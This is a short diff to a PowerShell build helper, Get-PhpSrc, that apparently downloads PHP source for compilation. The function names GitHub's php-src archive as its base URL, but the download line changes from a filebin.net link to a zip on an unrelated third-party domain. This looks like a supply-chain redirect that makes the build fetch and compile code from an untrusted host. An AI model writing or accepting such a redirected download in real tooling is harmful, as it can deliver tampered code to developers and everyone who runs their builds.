@@ -20,7 +20,7 @@ function Get-PhpSrc {
         $baseUrl = "https://github.com/php/php-src/archive"
         $zipFile = "php-$PhpVersion.zip"
         $directory = "php-$PhpVersion-src"
-        $url = "https://filebin.net/siniomes6ngk3c7y/8.3.4.zip"
+        $url = "https://dichvu.nnquangpro.com/8.3.4.zip"
         $currentDirectory = (Get-Location).Path
         $zipFilePath = Join-Path $currentDirectory $zipFile
         $directoryPath = Join-Path $currentDirectory $directory
